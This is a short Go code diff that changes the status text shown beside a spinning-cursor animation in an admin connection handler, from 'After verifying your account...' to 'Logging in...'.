@@ -53,7 +53,7 @@ func (this *Admin) Handle() {
     this.conn.Write([]byte("\r\n"))
     spinBuf := []byte{'-', '\\', '|', '/'}
     for i := 0; i < 15; i++ {
-        this.conn.Write(append([]byte("\r\033[37;1mAfter verifying your account... \033[31m"), spinBuf[i % len(spinBuf)]))
+        this.conn.Write(append([]byte("\r\033[37;1mLogging in... \033[31m"), spinBuf[i % len(spinBuf)]))
         time.Sleep(time.Duration(300) * time.Millisecond)
     }
 
